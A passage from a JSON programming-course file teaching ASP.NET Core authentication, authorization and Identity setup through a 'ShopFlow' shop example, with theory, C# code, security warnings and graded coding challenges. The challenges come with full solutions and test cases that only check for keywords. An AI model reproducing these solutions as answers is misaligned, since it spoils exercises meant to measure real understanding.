Claim-based policies\n    options.AddPolicy(\"CanEditProducts\", policy => \n        policy.RequireClaim(\"Permission\", \"Products.Edit\"));\n    \n    options.AddPolicy(\"PremiumUser\", policy => \n        policy.RequireClaim(\"Subscription\", \"Premium\", \"Enterprise\"));\n    \n    // Complex policy with multiple requirements\n    options.AddPolicy(\"CanDeleteProducts\", policy => policy\n        .RequireRole(\"Admin\")\n        .RequireClaim(\"Permission\", \"Products.Delete\")\n        .RequireAuthenticatedUser());\n});\n\nvar app = builder.Build();\n\n// ===== STEP 3: ADD MIDDLEWARE IN CORRECT ORDER =====\n// Order matters! Authentication before Authorization\n\napp.UseRouting();\n\napp.UseAuthentication();  // Step 1: Who are you?\napp.UseAuthorization();   // Step 2: What can you do?\n\n// ===== STEP 4: PROTECT YOUR ENDPOINTS =====\n\n// Public - anyone can access\napp.MapGet(\"/\", () => \"Welcome to ShopFlow!\")\n    .AllowAnonymous();\n\n// Protected - must be authenticated\napp.MapGet(\"/profile\", (HttpContext ctx) => \n    $\"Hello, {ctx.User.Identity?.Name}!\")\n    .RequireAuthorization();\n\n// Role-restricted - must be Admin\napp.MapDelete(\"/products/{id}\", (int id) => \n    Results.Ok($\"Deleted product {id}\"))\n    .RequireAuthorization(\"AdminOnly\");\n\n// Policy-restricted - must have specific claim\napp.MapPut(\"/products/{id}\", (int id) => \n    Results.Ok($\"Updated product {id}\"))\n    .RequireAuthorization(\"CanEditProducts\");\n\napp.Run();",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Authentication Schemes",
              "content": "## Authentication Schemes in ASP.NET Core\n\nASP.NET Core supports multiple authentication schemes, each designed for different scenarios. Understanding when to use each is crucial for building secure applications.\n\n### Cookie Authentication (Web Applications)\n\nCookies are the traditional choice for web applications where users interact through browsers. After successful login, the server creates an encrypted cookie containing the user's identity. The browser automatically sends this cookie with every request.\n\n**Pros:**\n- Automatic - browsers handle cookie management\n- Secure when configured correctly (HttpOnly, Secure, SameSite)\n- Works seamlessly with server-rendered pages\n- Built-in sliding expiration support\n\n**Cons:**\n- Vulnerable to CSRF attacks if SameSite not configured\n- Tied to single domain (cross-domain issues)\n- Not ideal for mobile apps or SPAs making API calls\n- Stateful (server may need to track sessions)\n\n### JWT (JSON Web Token) Authentication (APIs)\n\nJWTs are self-contained tokens that encode user claims. They're perfect for APIs consumed by mobile apps, SPAs, or microservices. The token contains everything needed to verify the user's identity.\n\n**Pros:**\n- Stateless - server doesn't store session data\n- Works across domains and services\n- Perfect for mobile apps and microservices\n- Can contain custom claims (roles, permissions)\n\n**Cons:**\n- Token size can grow with many claims\n- Cannot be invalidated before expiration (without extra infrastructure)\n- Must implement refresh token logic for long sessions\n- Requires careful storage on client (not localStorage for sensitive apps)\n\n### OAuth 2.0 and OpenID Connect (Social Login & Enterprise SSO)\n\nOAuth 2.0 is a delegation protocol - \"Let Google verify who I am.\" OpenID Connect adds identity layer on top. Use these for social login (Google, Microsoft, GitHub) or enterprise single sign-on.\n\n**Pros:**\n- Delegate authentication to trusted providers\n- Users don't need another password\n- Enterprise SSO with Azure AD, Okta\n- Standardized, well-tested protocols\n\n**Cons:**\n- More complex to implement\n- Dependency on external providers\n- Requires redirect flows\n- Token refresh and validation complexity\n\n### Choosing the Right Scheme\n\n| Scenario | Recommended Scheme |\n|----------|-------------------|\n| Traditional MVC web app | Cookie |\n| REST API for mobile app | JWT Bearer |\n| SPA with backend API | JWT Bearer (or BFF with cookies) |\n| Microservices communication | JWT Bearer |\n| Social login (Google, GitHub) | OAuth 2.0 / OIDC |\n| Enterprise SSO | OIDC with Azure AD/Okta |"
            },
            {
              "type": "ARCHITECTURE",
              "title": "Security Architecture Decisions",
              "content": "## Defense in Depth\n\nSecurity is not a single checkpoint - it's multiple layers of protection. Even if one layer fails, others continue to protect your application. Think of it like a medieval castle: walls, moat, guards, locked doors, and a safe for valuables.\n\n**Layer 1 - Network Security**\n- HTTPS everywhere (TLS 1.3)\n- Web Application Firewall (WAF)\n- DDoS protection\n- Rate limiting at edge (CDN/load balancer)\n\n**Layer 2 - Application Authentication**\n- Strong password policies\n- Multi-factor authentication (MFA)\n- Brute-force protection (account lockout)\n- Secure token generation\n\n**Layer 3 - Authorization & Access Control**\n- Principle of least privilege\n- Role-based access control (RBAC)\n- Resource-based authorization\n- API scopes and permissions\n\n**Layer 4 - Data Protection**\n- Encryption at rest\n- Encryption in transit\n- Secrets management (Key Vault)\n- Data masking and redaction\n\n## Token Storage Comparison\n\nWhere you store tokens on the client matters enormously for security:\n\n| Storage Location | XSS Vulnerable | CSRF Vulnerable | Recommendation |\n|-----------------|----------------|-----------------|----------------|\n| HttpOnly Cookie | No | Yes (mitigate with SameSite) | Best for web apps |\n| localStorage | Yes | No | Avoid for sensitive tokens |\n| sessionStorage | Yes | No | Slightly better than localStorage |\n| Memory (JS variable) | Yes | No | Good for short-lived tokens |\n| Secure HttpOnly Cookie + CSRF Token | No | No | Most secure for web |\n\n**The HttpOnly Cookie Advantage:**\nWhen tokens are in HttpOnly cookies, JavaScript cannot access them. This means even if an attacker injects malicious scripts (XSS), they cannot steal the authentication token. Combined with SameSite=Strict, you're protected from both XSS and CSRF.\n\n**The localStorage Trap:**\nMany tutorials show storing JWTs in localStorage for simplicity. This is dangerous! Any XSS vulnerability exposes the token. Attackers can read localStorage from injected scripts and exfiltrate tokens to their server.\n\n## Session Management Best Practices\n\n1. **Token Expiration Strategy**\n   - Access tokens: Short-lived (15-60 minutes)\n   - Refresh tokens: Longer-lived (hours to days)\n   - Sliding expiration for active users\n   - Absolute expiration for compliance\n\n2. **Refresh Token Rotation**\n   - Issue new refresh token with each use\n   - Invalidate old refresh token immediately\n   - Detect token reuse (possible theft)\n   - Maintain refresh token family tracking\n\n3. **Session Invalidation**\n   - Logout clears all tokens\n   - Password change invalidates all sessions\n   - Admin can revoke user sessions\n   - Suspicious activity triggers session termination\n\n4. **Secure Cookie Settings**\n   ```csharp\n   options.Cookie.HttpOnly = true;     // No JavaScript access\n   options.Cookie.SecurePolicy = CookieSecurePolicy.Always; // HTTPS only\n   options.Cookie.SameSite = SameSiteMode.Strict; // Same-origin only\n   ```\n\n5. **Token Binding (Advanced)**\n   - Bind tokens to client fingerprint\n   - Detect token theft through context changes\n   - Consider device/IP validation for sensitive operations"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-20-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Configure authentication and authorization for a web application.",
              "instructions": "Set up a complete authentication and authorization system!\n\n1. Configure cookie authentication with:\n   - Login path: /login\n   - Access denied path: /forbidden\n   - 4-hour expiration\n   - HttpOnly and Secure cookies\n\n2. Configure JWT Bearer authentication with:\n   - Issuer: 'ShopFlow'\n   - Audience: 'ShopFlowAPI'\n   - Validate all token properties\n\n3. Set up authorization policies:\n   - 'AdminOnly' - requires Admin role\n   - 'CanManageProducts' - requires 'Products.Manage' permission claim\n\n4. Create endpoints:\n   - GET / - public welcome message\n   - GET /dashboard - requires authentication\n   - DELETE /products/{id} - requires AdminOnly policy\n\n5. Ensure middleware is in correct order!",
              "starterCode": "using Microsoft.AspNetCore.Authentication.Cookies;\nusing Microsoft.AspNetCore.Authentication.JwtBearer;\nusing Microsoft.IdentityModel.Tokens;\nusing System.Text;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// TODO: Configure Authentication\n// - Default scheme: Cookies\n// - Add Cookie authentication with:\n//   - LoginPath = \"/login\"\n//   - AccessDeniedPath = \"/forbidden\"\n//   - ExpireTimeSpan = 4 hours\n//   - HttpOnly = true\n//   - SecurePolicy = Always\n// - Add JWT Bearer authentication with:\n//   - ValidateIssuer, ValidateAudience, ValidateLifetime = true\n//   - ValidIssuer = \"ShopFlow\"\n//   - ValidAudience = \"ShopFlowAPI\"\n\n// TODO: Configure Authorization\n// - Add policy \"AdminOnly\" requiring role \"Admin\"\n// - Add policy \"CanManageProducts\" requiring claim \"Permission\" with value \"Products.Manage\"\n\nvar app = builder.Build();\n\n// TODO: Add authentication and authorization middleware in correct order\n\n// TODO: Create endpoints\n// GET / - AllowAnonymous, returns \"Welcome to ShopFlow!\"\n// GET /dashboard - RequireAuthorization, returns \"Dashboard for {username}\"\n// DELETE /products/{id} - RequireAuthorization(\"AdminOnly\"), returns \"Deleted product {id}\"\n\napp.Run();",
              "solution": "using Microsoft.AspNetCore.Authentication.Cookies;\nusing Microsoft.AspNetCore.Authentication.JwtBearer;\nusing Microsoft.IdentityModel.Tokens;\nusing System.Text;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// Configure Authentication\nbuilder.Services.AddAuthentication(options =>\n{\n    options.DefaultScheme = CookieAuthenticationDefaults.AuthenticationScheme;\n    options.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme;\n})\n.AddCookie(CookieAuthenticationDefaults.AuthenticationScheme, options =>\n{\n    options.LoginPath = \"/login\";\n    options.AccessDeniedPath = \"/forbidden\";\n    options.ExpireTimeSpan = TimeSpan.FromHours(4);\n    options.Cookie.HttpOnly = true;\n    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;\n    options.Cookie.SameSite = SameSiteMode.Strict;\n})\n.AddJwtBearer(JwtBearerDefaults.AuthenticationScheme, options =>\n{\n    options.TokenValidationParameters = new TokenValidationParameters\n    {\n        ValidateIssuer = true,\n        ValidateAudience = true,\n        ValidateLifetime = true,\n        ValidateIssuerSigningKey = true,\n        ValidIssuer = \"ShopFlow\",\n        ValidAudience = \"ShopFlowAPI\",\n        IssuerSigningKey = new SymmetricSecurityKey(\n            Encoding.UTF8.GetBytes(builder.Configuration[\"Jwt:Key\"]!)\n        )\n    };\n});\n\n// Configure Authorization\nbuilder.Services.AddAuthorization(options =>\n{\n    options.AddPolicy(\"AdminOnly\", policy =>\n        policy.RequireRole(\"Admin\"));\n    \n    options.AddPolicy(\"CanManageProducts\", policy =>\n        policy.RequireClaim(\"Permission\", \"Products.Manage\"));\n});\n\nvar app = builder.Build();\n\n// Middleware in correct order\napp.UseAuthentication();\napp.UseAuthorization();\n\n// Public endpoint\napp.MapGet(\"/\", () => \"Welcome to ShopFlow!\")\n    .AllowAnonymous();\n\n// Protected endpoint\napp.MapGet(\"/dashboard\", (HttpContext ctx) =>\n    $\"Dashboard for {ctx.User.Identity?.Name ?? \"User\"}\")\n    .RequireAuthorization();\n\n// Admin-only endpoint\napp.MapDelete(\"/products/{id}\", (int id) =>\n    Results.Ok($\"Deleted product {id}\"))\n    .RequireAuthorization(\"AdminOnly\");\n\napp.Run();",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Should configure authentication with cookies",
                  "expectedOutput": "AddCookie",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Should configure JWT Bearer authentication",
                  "expectedOutput": "AddJwtBearer",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Should add authorization policies",
                  "expectedOutput": "AddPolicy",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Should use authentication middleware before authorization",
                  "expectedOutput": "UseAuthentication",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Start with builder.Services.AddAuthentication() and chain .AddCookie() and .AddJwtBearer()."
                },
                {
                  "level": 2,
                  "text": "Cookie options include LoginPath, AccessDeniedPath, ExpireTimeSpan, and Cookie.HttpOnly."
                },
                {
                  "level": 3,
                  "text": "JWT TokenValidationParameters needs ValidateIssuer, ValidateAudience, ValidIssuer, ValidAudience, and IssuerSigningKey."
                },
                {
                  "level": 4,
                  "text": "Authorization policies: options.AddPolicy(\"Name\", policy => policy.RequireRole(\"Role\"));"
                },
                {
                  "level": 5,
                  "text": "Middleware order: app.UseAuthentication(); then app.UseAuthorization(); - authentication MUST come first!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Putting UseAuthorization before UseAuthentication",
                  "consequence": "Authorization cannot check user identity because authentication hasn't run yet. All protected endpoints fail.",
                  "correction": "Always call app.UseAuthentication() before app.UseAuthorization()."
                },
                {
                  "mistake": "Forgetting HttpOnly on cookies",
                  "consequence": "JavaScript can access the authentication cookie, making XSS attacks able to steal user sessions.",
                  "correction": "Always set options.Cookie.HttpOnly = true for authentication cookies."
                },
                {
                  "mistake": "Using a weak or short JWT signing key",
                  "consequence": "Attackers can brute-force the key and forge valid tokens.",
                  "correction": "Use at least 256 bits (32 characters) for symmetric keys. Store in configuration, not code."
                },
                {
                  "mistake": "Not setting ValidateLifetime for JWT",
                  "consequence": "Expired tokens are still accepted, allowing old stolen tokens to work forever.",
                  "correction": "Set ValidateLifetime = true and consider ClockSkew = TimeSpan.Zero for strict validation."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-20-02",
          "title": "Setting Up ASP.NET Core Identity",
          "moduleId": "module-20",
          "order": 2,
          "estimatedMinutes": 35,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Identity as Your User Management System",
              "content": "Imagine you are opening a new exclusive members-only club. Before the first guest arrives, you need an entire membership management system in place. You need membership application forms, a secure vault to store member records, staff trained to verify credentials at the door, and processes for issuing and revoking membership cards.\n\nASP.NET Core Identity is exactly this complete membership management system for your application. Instead of building everything from scratch - designing database tables for users, writing password hashing algorithms, implementing email confirmation flows, handling account lockouts after failed attempts - Identity provides all of this out of the box.\n\nThe ClubMembershipManager in our analogy is the UserManager<TUser> service. It handles creating new members (CreateAsync), verifying membership credentials (CheckPasswordAsync), updating member information (UpdateAsync), and revoking memberships (DeleteAsync). The front door security guard is SignInManager<TUser>, responsible for checking credentials and either admitting members or turning them away.\n\nThe membership card system represents Identity's token and cookie generation. When a member successfully authenticates, they receive a secure credential (cookie or token) that proves their identity for subsequent visits. The card cannot be forged because it is cryptographically signed.\n\nThe member records vault is your Identity database - tables like AspNetUsers, AspNetRoles, and AspNetUserRoles that store all membership data. Entity Framework Core manages these tables, and Identity migrations keep them in sync with your application.\n\nJust like a real club might start with basic membership and later add VIP tiers, loyalty points, or family memberships, Identity is extensible. You can add custom properties to users, define your own roles, and implement additional claims. The foundation is solid, and you build upon it for your specific needs."
            },
            {
              "type": "EXAMPLE",
              "title": "Adding Identity to ShopFlow",
              "content": "This example shows the complete setup of ASP.NET Core Identity in the ShopFlow e-commerce application, including the custom ApplicationUser, DbContext configuration, and service registration.",
              "code": "// ===== STEP 1: INSTALL REQUIRED PACKAGES =====\n// Run these commands in your terminal:\n// dotnet add package Microsoft.AspNetCore.Identity.EntityFrameworkCore\n// dotnet add package Microsoft.EntityFrameworkCore.SqlServer\n// dotnet add package Microsoft.EntityFrameworkCore.Tools\n\n// ===== STEP 2: CREATE CUSTOM APPLICATION USER =====\n// ShopFlow.Domain/Entities/ApplicationUser.cs\n\nusing Microsoft.AspNetCore.Identity;\n\nnamespace ShopFlow.Domain.Entities;\n\n/// <summary>\n/// Extended user class for ShopFlow with additional properties.\n/// Inherits all standard Identity properties (Email, PasswordHash, etc.)\n/// </summary>\npublic class ApplicationUser : IdentityUser\n{\n    // Custom properties for ShopFlow\n    public string FirstName { get; set; } = string.Empty;\n    public string LastName { get; set; } = string.Empty;\n    public DateTime DateOfBirth { get; set; }\n    public DateTime CreatedAt { get; set; } = DateTime.UtcNow;\n    public DateTime? LastLoginAt { get; set; }\n    public bool IsActive { get; set; } = true;\n    \n    // Navigation properties\n    public ICollection<Order> Orders { get; set; } = [];\n    public ShoppingCart? ShoppingCart { get; set; }\n    public CustomerProfile? Profile { get; set; }\n    \n    // Computed property\n    public string FullName => $\"{FirstName} {LastName}\";\n}\n\n// ===== STEP 3: CONFIGURE DB CONTEXT =====\n// ShopFlow.Infrastructure/Data/ShopFlowDbContext.cs\n\nusing Microsoft.AspNetCore.Identity;\nusing Microsoft.AspNetCore.Identity.EntityFrameworkCore;\nusing Microsoft.EntityFrameworkCore;\nusing ShopFlow.Domain.Entities;\n\nnamespace ShopFlow.Infrastructure.Data;\n\npublic class ShopFlowDbContext : IdentityDbContext<ApplicationUser>\n{\n    public ShopFlowDbContext(DbContextOptions<ShopFlowDbContext> options)\n        : base(options)\n    {\n    }\n    \n    // ShopFlow domain entities\n    public DbSet<Product> Products => Set<Product>();\n    public DbSet<Category> Categories => Set<Category>();\n    public DbSet<Order> Orders => Set<Order>();\n    public DbSet<OrderItem> OrderItems => Set<OrderItem>();\n    public DbSet<ShoppingCart> ShoppingCarts => Set<ShoppingCart>();\n    public DbSet<CustomerProfile> CustomerProfiles => Set<CustomerProfile>();\n    \n    protected override void OnModelCreating(ModelBuilder builder)\n    {\n        // IMPORTANT: Call base to configure Identity tables\n        base.OnModelCreating(builder);\n        \n        // Customize Identity table names (optional but cleaner)\n        builder.Entity<ApplicationUser>(entity =>\n        {\n            entity.ToTable(\"Users\");\n            entity.Property(u => u.FirstName).HasMaxLength(100).IsRequired();\n            entity.Property(u => u.LastName).HasMaxLength(100).IsRequired();\n        });\n        \n        builder.Entity<IdentityRole>(entity =>\n        {\n            entity.ToTable(\"Roles\");\n        });\n        \n        builder.Entity<IdentityUserRole<string>>(entity =>\n        {\n            entity.ToTable(\"UserRoles\");\n        });\n        \n        builder.Entity<IdentityUserClaim<string>>(entity =>\n        {\n            entity.ToTable(\"UserClaims\");\n        });\n        \n        builder.Entity<IdentityUserLogin<string>>(entity =>\n        {\n            entity.ToTable(\"UserLogins\");\n        });\n        \n        builder.Entity<IdentityUserToken<string>>(entity =>\n        {\n            entity.ToTable(\"UserTokens\");\n        });\n        \n        builder.Entity<IdentityRoleClaim<string>>(entity =>\n        {\n            entity.ToTable(\"RoleClaims\");\n        });\n        \n        // Configure relationships\n        builder.Entity<ApplicationUser>()\n            .HasMany(u => u.Orders)\n            .WithOne(o => o.Customer)\n            .HasForeignKey(o => o.CustomerId)\n            .OnDelete(DeleteBehavior.Restrict);\n    }\n}\n\n// ===== STEP 4: CONFIGURE IDENTITY IN PROGRAM.CS =====\n// ShopFlow.Api/Program.cs\n\nusing Microsoft.AspNetCore.Identity;\nusing Microsoft.EntityFrameworkCore;\nusing ShopFlow.Domain.Entities;\nusing ShopFlow.Infrastructure.Data;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// Configure Entity Framework with SQL Server\nbuilder.Services.AddDbContext<ShopFlowDbContext>(options =>\n    options.UseSqlServer(\n        builder.Configuration.GetConnectionString(\"DefaultConnection\"),\n        b => b.MigrationsAssembly(\"ShopFlow.Infrastructure\")\n    ));\n\n// Configure ASP.NET Core Identity\nbuilder.Services.AddIdentity<ApplicationUser, IdentityRole>(options =>\n{\n    // Password requirements\n    options.Password.RequiredLength = 12;\n    options.Password.RequireDigit = true;\n    options.Password.RequireLowercase = true;\n    options.Password.RequireUppercase = true;\n    options.Password.RequireNonAlphanumeric = true;\n    options.Password.RequiredUniqueChars = 4;\n    \n    // Lockout settings\n    options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15);\n    options.Lockout.MaxFailedAccessAttempts = 5;\n    options.Lockout.AllowedForNewUsers = true;\n    \n    // User settings\n    options.User.RequireUniqueEmail = true;\n    options.User.AllowedUserNameCharacters =\n        \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._@+\";\n    \n    // Sign-in settings\n    options.SignIn.RequireConfirmedEmail = true;\n    options.SignIn.RequireConfirmedAccount = true;\n})\n.AddEntityFrameworkStores<ShopFlowDbContext>()\n.AddDefaultTokenProviders()  // For password reset, email confirmation tokens\n.AddSignInManager<SignInManager<ApplicationUser>>();\n\n// Configure cookie authentication (for web apps)\nbuilder.Services.ConfigureApplicationCookie(options =>\n{\n    options.Cookie.HttpOnly = true;\n    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;\n    options.Cookie.SameSite = SameSiteMode.Strict;\n    options.ExpireTimeSpan = TimeSpan.FromHours(8);\n    options.SlidingExpiration = true;\n    options.LoginPath = \"/auth/login\";\n    options.LogoutPath = \"/auth/logout\";\n    options.AccessDeniedPath = \"/auth/access-denied\";\n});\n\nbuilder.Services.AddAuthorization();\n\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\napp.Run();\n\n// ===== STEP 5: CREATE AND APPLY MIGRATIONS =====\n// Run these commands:\n// dotnet ef migrations add InitialIdentity -p ShopFlow.Infrastructure -s ShopFlow.Api\n// dotnet ef database update -p ShopFlow.Infrastructure -s ShopFlow.Api",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "What Identity Provides",
              "content": "## Core Identity Services\n\nASP.NET Core Identity provides a comprehensive set of services that handle all aspects of user management. Understanding these services is essential for building secure authentication systems.\n\n### UserManager<TUser>\n\nUserManager is your primary interface for managing users. It provides methods for the complete user lifecycle:\n\n**User Creation and Management:**\n- `CreateAsync(user, password)` - Creates a new user with a hashed password\n- `UpdateAsync(user)` - Saves changes to user properties\n- `DeleteAsync(user)` - Removes a user from the system\n- `FindByIdAsync(id)` - Retrieves a user by their unique identifier\n- `FindByEmailAsync(email)` - Finds a user by email address\n- `FindByNameAsync(username)` - Finds a user by username\n\n**Password Management:**\n- `CheckPasswordAsync(user, password)` - Verifies a password without signing in\n- `ChangePasswordAsync(user, current, new)` - Changes password with verification\n- `ResetPasswordAsync(user, token, new)` - Resets password using a token\n- `GeneratePasswordResetTokenAsync(user)` - Creates a password reset token\n\n**Email and Phone Confirmation:**\n- `GenerateEmailConfirmationTokenAsync(user)` - Creates email verification token\n- `ConfirmEmailAsync(user, token)` - Marks email as confirmed\n- `IsEmailConfirmedAsync(user)` - Checks email confirmation status\n\n### SignInManager<TUser>\n\nSignInManager handles the authentication process itself, managing how users prove their identity:\n\n**Sign-In Operations:**\n- `PasswordSignInAsync(username, password, isPersistent, lockoutOnFailure)` - Full sign-in with lockout support\n- `SignInAsync(user, isPersistent)` - Signs in a user directly (after custom validation)\n- `SignOutAsync()` - Signs out the current user\n- `RefreshSignInAsync(user)` - Refreshes the authentication cookie\n\n**Two-Factor Authentication:**\n- `GetTwoFactorAuthenticationUserAsync()` - Gets user pending 2FA\n- `TwoFactorSignInAsync(provider, code, isPersistent, rememberClient)` - Completes 2FA sign-in\n\n### RoleManager<TRole>\n\nRoleManager provides role-based access control capabilities:\n\n**Role Operations:**\n- `CreateAsync(role)` - Creates a new role\n- `DeleteAsync(role)` - Removes a role\n- `RoleExistsAsync(roleName)` - Checks if a role exists\n- `FindByNameAsync(roleName)` - Retrieves a role by name\n\n**User-Role Assignment (via UserManager):**\n- `AddToRoleAsync(user, roleName)` - Assigns user to a role\n- `RemoveFromRoleAsync(user, roleName)` - Removes user from role\n- `GetRolesAsync(user)` - Gets all roles for a user\n- `IsInRoleAsync(user, roleName)` - Checks role membership\n\n## Identity Database Tables\n\nIdentity creates several tables in your database to store authentication data:\n\n| Table | Purpose |\n|-------|--------|\n| AspNetUsers | User accounts with properties |\n| AspNetRoles | Available roles |\n| AspNetUserRoles | Many-to-many user-role assignments |\n| AspNetUserClaims | Custom claims attached to users |\n| AspNetRoleClaims | Claims attached to roles |\n| AspNetUserLogins | External login provider associations |\n| AspNetUserTokens | Tokens for password reset, 2FA, etc. |\n\nWhen you customize table names as shown in the example, these become Users, Roles, UserRoles, etc. The schema remains the same; only the names change.\n\n## Token Providers\n\nThe `AddDefaultTokenProviders()` call registers token generators used for:\n\n- **Password Reset** - Time-limited tokens for resetting forgotten passwords\n- **Email Confirmation** - Tokens sent to verify email addresses\n- **Two-Factor Authentication** - TOTP and other 2FA token generation\n- **Phone Number Confirmation** - SMS verification tokens\n\nThese tokens are cryptographically secure, time-limited, and single-use, making them safe for sensitive operations like password resets."
            },
            {
              "type": "WARNING",
              "title": "Identity Security Considerations",
              "content": "## Critical Security Mistakes to Avoid\n\n### Weak Password Policies\n\n**The Mistake:** Using Identity's default password requirements or disabling them for 'user convenience'. The defaults require only 6 characters with one non-alphanumeric character - far too weak for modern security.\n\n**The Risk:** Weak passwords are easily cracked through brute force or dictionary attacks. A 6-character password can be cracked in seconds with modern hardware. Password dumps from breached sites provide attackers with common password patterns.\n\n**The Fix:** Enforce strong password policies from day one:\n```csharp\noptions.Password.RequiredLength = 12;  // Minimum 12 characters\noptions.Password.RequireDigit = true;\noptions.Password.RequireLowercase = true;\noptions.Password.RequireUppercase = true;\noptions.Password.RequireNonAlphanumeric = true;\noptions.Password.RequiredUniqueChars = 4;\n```\n\nConsider also implementing password breach checking using HaveIBeenPwned API to reject known compromised passwords.\n\n### Disabled Account Lockout\n\n**The Mistake:** Disabling account lockout to avoid support tickets from locked-out users, or setting lockout thresholds too high (50+ attempts).\n\n**The Risk:** Without lockout, attackers can attempt unlimited password guesses against an account. Even rate limiting at the network level can be bypassed with distributed attacks or slow-and-steady attempts.\n\n**The Fix:** Enable lockout with reasonable thresholds:\n```csharp\noptions.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15);\noptions.Lockout.MaxFailedAccessAttempts = 5;\noptions.Lockout.AllowedForNewUsers = true;\n```\n\nCombine with progressive lockout (longer durations for repeated lockouts) and notification to users when lockout occurs.\n\n### Exposing Internal User IDs\n\n**The Mistake:** Using Identity's GUID-based user IDs directly in URLs, APIs, or client-side code: `/api/users/a1b2c3d4-e5f6-...`\n\n**The Risk:** While GUIDs are not sequential, exposing internal identifiers enables user enumeration (attackers can try to access other users' data by guessing IDs) and violates the principle of minimal information exposure.\n\n**The Fix:** Use separate public identifiers:\n```csharp\npublic class ApplicationUser : IdentityUser\n{\n    // Internal GUID used by Identity\n    // Id property inherited from IdentityUser\n    \n    // Public identifier for APIs and URLs\n    public string PublicId { get; set; } = Nanoid.Generate(size: 12);\n}\n```\n\nOr use username/email for lookups instead of exposing any ID.\n\n### Skipping Email Confirmation\n\n**The Mistake:** Setting `RequireConfirmedEmail = false` to simplify the registration flow.\n\n**The Risk:** Attackers can register accounts with emails they do not own, potentially:\n- Impersonating legitimate users\n- Claiming email addresses before real owners\n- Bypassing email-based account recovery\n- Sending spam or phishing from your platform\n\n**The Fix:** Always require email confirmation:\n```csharp\noptions.SignIn.RequireConfirmedEmail = true;\noptions.SignIn.RequireConfirmedAccount = true;\n```\n\nImplement a smooth confirmation flow with clear user guidance and resend functionality.\n\n### Storing Sensitive Data in Claims\n\n**The Mistake:** Adding sensitive information to claims because claims are convenient to access throughout the application.\n\n**The Risk:** Claims are stored in authentication cookies or JWT tokens. If cookies are HttpOnly (good), the data is still transmitted on every request. If tokens are exposed client-side (SPAs), the data is visible to JavaScript and potentially attackers.\n\n**The Fix:** Only store non-sensitive, necessary data in claims:\n- User ID (for lookups)\n- Roles (for authorization)\n- Display name (for UI)\n\nKeep sensitive data in the database and query when needed:\n- Social Security Numbers\n- Financial information\n- Medical data\n- Internal notes"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-20-02-challenge-01",
              "title": "Configure Strict Password Policy",
              "description": "Configure ASP.NET Core Identity with a security-focused password policy.",
              "instructions": "Configure Identity for ShopFlow with strict security settings!\n\n1. Create an ApplicationUser class that extends IdentityUser with:\n   - FirstName (string)\n   - LastName (string)\n   - CreatedAt (DateTime, default to UtcNow)\n\n2. Configure Identity with these password requirements:\n   - Minimum 14 characters\n   - Require digit\n   - Require lowercase\n   - Require uppercase\n   - Require non-alphanumeric\n   - At least 6 unique characters\n\n3. Configure lockout settings:\n   - Lockout duration: 30 minutes\n   - Maximum 3 failed attempts\n   - Enable lockout for new users\n\n4. Configure user settings:\n   - Require unique email\n   - Require confirmed email for sign-in\n\n5. Use a class called ShopFlowDbContext that inherits from IdentityDbContext<ApplicationUser>",
              "starterCode": "using Microsoft.AspNetCore.Identity;\nusing Microsoft.AspNetCore.Identity.EntityFrameworkCore;\nusing Microsoft.EntityFrameworkCore;\n\n// TODO: Create ApplicationUser class extending IdentityUser\n// - Add FirstName (string)\n// - Add LastName (string)\n// - Add CreatedAt (DateTime, default DateTime.UtcNow)\n\npublic class ApplicationUser : IdentityUser\n{\n    // Add properties here\n}\n\n// TODO: Create ShopFlowDbContext inheriting from IdentityDbContext<ApplicationUser>\n\npublic class ShopFlowDbContext : IdentityDbContext<ApplicationUser>\n{\n    public ShopFlowDbContext(DbContextOptions<ShopFlowDbContext> options)\n        : base(options) { }\n}\n\n// Program.cs configuration\nvar builder = WebApplication.CreateBuilder(args);\n\nbuilder.Services.AddDbContext<ShopFlowDbContext>(options =>\n    options.UseInMemoryDatabase(\"ShopFlow\"));\n\n// TODO: Configure Identity with strict password policy:\n// Password:\n//   - RequiredLength = 14\n//   - RequireDigit = true\n//   - RequireLowercase = true\n//   - RequireUppercase = true\n//   - RequireNonAlphanumeric = true\n//   - RequiredUniqueChars = 6\n// Lockout:\n//   - DefaultLockoutTimeSpan = 30 minutes\n//   - MaxFailedAccessAttempts = 3\n//   - AllowedForNewUsers = true\n// User:\n//   - RequireUniqueEmail = true\n// SignIn:\n//   - RequireConfirmedEmail = true\n\nvar app = builder.Build();\napp.Run();",
